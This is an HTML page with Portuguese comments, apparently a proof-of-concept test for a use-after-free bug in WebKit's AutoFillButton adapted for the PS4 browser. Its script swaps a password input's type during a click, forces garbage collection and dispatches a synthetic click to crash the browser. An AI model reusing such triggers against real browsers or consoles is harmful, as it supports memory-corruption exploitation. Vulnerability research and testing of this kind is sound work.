<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<style>
    body { font-family: sans-serif; padding: 20px; }
    input { width: 300px; height: 40px; font-size: 16px; }
    #console { white-space: pre-wrap; font-family: monospace; margin-top: 20px; }
</style>
</head>
<body>

<div id="result">
    <p>Teste de AutoFillButton UAF (Adaptado para PS4)</p>
    <input type="password" id="passwordInput" placeholder="Clique no campo ou no botão abaixo">
</div>
<br>
<button id="manualTrigger" style="padding: 10px 20px; font-size: 16px;">Simular Clique no Botão / Preenchimento</button>
<div id="console"></div>

<script>
// --- Função GC integrada do arquivo gc.js fornecido ---
if (!window.gc) {
    window.gc = function() {
        if (typeof window.GCController !== "undefined")
            return GCController.collect();

        // Fallback de pressão de memória caso GCController não esteja exposto
        function gcRec(n) {
            if (n < 1) return {};
            var temp = {i: "ab" + n + (n / 100000)};
            temp += "foo";
            gcRec(n-1);
        }
        for (let i = 0; i < 1000; i++)
            gcRec(10);
    }
}

function debug(msg) {
    document.getElementById('console').innerHTML += msg + '<br>';
}

onload = () => {
    const input = document.querySelector('input');
    const triggerBtn = document.getElementById('manualTrigger');

    // Listener principal que reproduz o gatilho da vulnerabilidade: 
    // altera o tipo do input no meio do evento de clique, destruindo o owner antigo
    input.addEventListener('click', () => {
        debug("Evento de clique disparado: alterando input.type para 'button'...");
        input.type = 'button';
        
        // Executa a coleta de lixo integrada
        if (typeof window.gc === 'function') {
            window.gc();
            debug("Coleta de lixo (gc) executada.");
        }
    }, { once: true });

    // Função de ativação simulada para o navegador do console
    triggerBtn.addEventListener('click', () => {
        debug("Simulando ativação do elemento...");
        input.focus();
        
        // Dispara um evento de clique sintético para acionar o fluxo do elemento de sombra
        const clickEvent = new MouseEvent('click', {
            view: window,
            bubbles: true,
            cancelable: true
        });
        input.dispatchEvent(clickEvent);
        
        document.getElementById('result').innerHTML += '<p><strong>Teste executado. Se o navegador não fechou abruptamente, a proteção de ponteiro está ativa ou o ambiente tratou a falha com segurança.</strong></p>';
    });

    debug("Pronto. Clique em 'Simular Clique no Botão / Preenchimento' para iniciar.");
};
</script>

</body>
</html>
